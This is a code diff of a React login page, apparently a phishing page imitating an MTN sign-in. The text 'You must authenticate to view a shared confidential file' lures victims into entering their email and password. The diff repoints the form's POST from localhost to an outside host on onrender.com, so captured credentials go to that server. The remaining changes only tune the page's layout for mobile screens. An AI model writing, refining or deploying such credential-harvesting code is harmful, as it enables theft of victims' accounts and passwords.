@@ -76,7 +76,7 @@ const MtnLoginPage: React.FC = () => {
     setLoading(true);
 
     try {
-      await axios.post("http://localhost:8080/send-email", { email, password });
+      await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
       setError("");
     } catch (err) {
       setError("Failed to send email. Try again!");
@@ -97,16 +97,17 @@ const MtnLoginPage: React.FC = () => {
         backgroundSize: "cover",
         backgroundPosition: "center",
         backdropFilter: "blur(5px)",
+        p: { xs: 2, sm: 3 }, 
       }}
     >
       <Box
         sx={{
           width: "100%",
-          maxWidth: 400,
+          maxWidth: { xs: "90%", sm: 400 }, 
           bgcolor: "rgba(255, 255, 255, 0.9)",
           borderRadius: 2,
           boxShadow: 3,
-          p: 4,
+          p: { xs: 2, sm: 4 }, 
           textAlign: "center",
           backdropFilter: "blur(8px)",
         }}
@@ -133,7 +134,7 @@ const MtnLoginPage: React.FC = () => {
             color: "firebrick",
             mt: 2,
             textTransform: "uppercase",
-            fontSize: 18,
+            fontSize: { xs: 16, sm: 18 }, 
           }}
         >
           <b>You must authenticate to view a shared confidential file.</b>
